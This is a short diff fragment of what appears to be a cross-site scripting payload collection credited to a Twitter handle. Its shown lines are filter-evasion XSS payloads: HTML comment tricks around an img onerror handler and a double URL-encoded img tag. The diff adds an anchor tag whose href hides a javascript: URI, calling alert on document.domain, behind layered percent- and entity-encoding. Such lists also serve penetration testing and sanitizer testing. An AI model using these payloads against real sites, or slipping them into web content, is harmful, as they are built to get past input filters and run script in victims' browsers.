@@ -21,3 +21,5 @@ https://twitter.com/joris909
 <--`<img/src=` onerror=confirm``> --!>
 
 <--%253cimg%20onerror=alert(1)%20src=a%253e --!>
+
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
